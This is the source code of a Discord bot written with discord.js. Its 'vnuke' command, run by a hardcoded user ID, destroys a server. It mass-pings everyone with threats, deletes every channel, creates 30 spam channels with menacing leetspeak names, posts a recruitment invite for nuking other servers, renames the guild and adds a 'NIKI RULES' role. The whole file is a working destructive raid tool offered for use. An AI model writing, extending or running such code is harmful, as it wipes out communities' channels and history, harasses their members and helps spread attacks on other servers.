require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const PREFIX = process.env.PREFIX || '!';

// 🔥 METS TON ID UTILISATEUR ICI (pas dans .env)
const AUTHORIZED_ID = "1474433573174907054"; // Remplace par ton ID Discord

client.once('ready', () => {
    console.log(`✅ Connected as ${client.user.tag}`);
    console.log(`📊 ${client.guilds.cache.size} servers`);
    console.log(`🔧 Prefix: ${PREFIX}`);
    console.log(`👤 Authorized user ID: ${AUTHORIZED_ID}`);
    console.log('====================================');
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'vnuke') {
        await handleNuke(message);
    }
});

async function handleNuke(message) {
    // Check authorized ID (directly in the code)
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need administrator permissions!');
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ I need administrator permissions!');
    }

    await message.reply('💣 **NUKE IN PROGRESS...**');

    const guild = message.guild;

    try {
        // 1. Send warnings in all channels
        const channels = guild.channels.cache;
        for (const [id, channel] of channels) {
            if (channel.type === ChannelType.GuildText) {
                try {
                    await channel.send('@everyone @here **🔥 Y0UR S3RV3R W1LL B3 D3STR0Y3D BY N1K1 !**');
                    await channel.send('@everyone @here **💀 Y0U C4NN0T 3SC4P3 !**');
                } catch {}
            }
        }

        // 2. Delete all channels
        for (const [id, channel] of channels) {
            try {
                await channel.delete();
            } catch (e) {}
        }

        // 3. Create 30 new channels with hacker-style names
        const scaryNames = [
            'N1K1-1S-H3R3', 'Y0U-C4NT-3SC4P3', 'PR4Y-F0R-M3RCY', 'D34TH-1S-C0M1NG',
            'F0R3V3R-NUK3D', 'D3L3T3D-FR0M-3X1ST3NC3', 'G4M3-0V3R-M4N', 'N0-M3RCY',
            'F1R3W4LL', 'D4RK-S1D3', 'S4T4N-W4TCH3S', 'N1K1-3D1T10N',
            'F0RG0TT3N-S0UL', 'V0ID-0F-D34TH', 'D3STR0Y3R', '4N4RCHY',
            'P4N1C-M0D3', 'D4WN-0F-NUK3', 'N3TFL1X-0F-D34TH', 'BR4IN-R0T',
            'K4RM4-1S-C0M1NG', 'NUK3-4G41N', 'C4RN4G3', 'CH40S-TH30RY',
            'D3M0N-SP4WN', 'PH3N1X-R1S3', 'R3B0RN-FR0M-4SH3S', 'NUK3D-4-L1F3',
            'H3LL-1S-H3R3', 'W3LC0M3-T0-H3LL'
        ];

        const scaryMessages = [
            '@everyone @here **🔥 N1K1 H4S D3STR0Y3D TH1S S3RV3R !**\n**💀 Y0U C4NN0T 3SC4P3 !**\n\n**J01N TH3 D4RK S1D3 T0 NUK3 4NY S3RV3R:**\nhttps://discord.gg/eVTU7sW3wv',
            '@everyone @here **💀 TH3 S3RV3R 1S D34D !**\n**👹 N1K1 W1NS !**\n\n**J01N TH3 D4RK S1D3 T0 NUK3 4NY S3RV3R:**\nhttps://discord.gg/eVTU7sW3wv',
            '@everyone @here **👹 F0R3V3R NUK3D !**\n**⚡ Y0UR D4T4 1S L0ST !**\n\n**J01N TH3 D4RK S1D3 T0 NUK3 4NY S3RV3R:**\nhttps://discord.gg/eVTU7sW3wv'
        ];

        const inviteLink = 'https://discord.gg/eVTU7sW3wv';

        for (let i = 0; i < 30; i++) {
            const name = scaryNames[i % scaryNames.length] + '-' + (i + 1);
            try {
                const channel = await guild.channels.create({
                    name: name,
                    type: ChannelType.GuildText,
                });
                const msg = scaryMessages[i % scaryMessages.length] + `\n\n**J01N TH3 D4RK S1D3 : ${inviteLink}**`;
                await channel.send(msg);
            } catch (e) {}
        }

        // 4. Rename server
        try {
            await guild.setName('🔥 NUKED BY NIKI 🔥');
        } catch (e) {}

        // 5. Create special role
        try {
            const role = await guild.roles.create({
                name: 'NIKI RULES',
                color: '#FF0000',
                hoist: true,
                mentionable: true
            });
            const botMember = guild.members.me;
            await botMember.roles.add(role);
        } catch (e) {}

        await message.channel.send('✅ **NUKE COMPLETE!**\n🔥 Server destroyed by NIKI!\n👹 **@everyone @here** The server is dead!');

    } catch (error) {
        console.error(error);
        await message.channel.send('❌ Error during nuke: ' + error.message);
    }
}

client.login(process.env.TOKEN);